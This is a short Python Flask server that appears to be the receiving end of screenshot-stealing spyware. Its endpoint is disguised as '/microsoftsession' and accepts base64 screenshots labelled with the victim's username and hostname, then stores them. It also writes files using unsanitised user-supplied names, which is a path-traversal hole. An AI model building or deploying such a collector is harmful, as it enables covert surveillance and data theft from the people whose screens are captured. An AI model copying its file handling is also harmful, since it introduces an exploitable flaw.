from flask import Flask, request
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Directory to store screenshots
output_dir = "screenshots"
os.makedirs(output_dir, exist_ok=True)

@app.route("/microsoftsession", methods=["POST"])
def upload():
    try:
        data = request.json
        image_data = base64.b64decode(data["image"])
        screen_name = data["screen"].replace("\\", "_")  # Clean screen name
        user = data.get("user", "unknown_user")  # Get username
        hostname = data.get("hostname", "unknown_host")  # Updated key name

        # Save file with user and host info
        filename = f"{output_dir}/screenshot_{user}_{hostname}_{screen_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, "wb") as f:
            f.write(image_data)

        return {"status": "success", "filename": filename}, 200
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
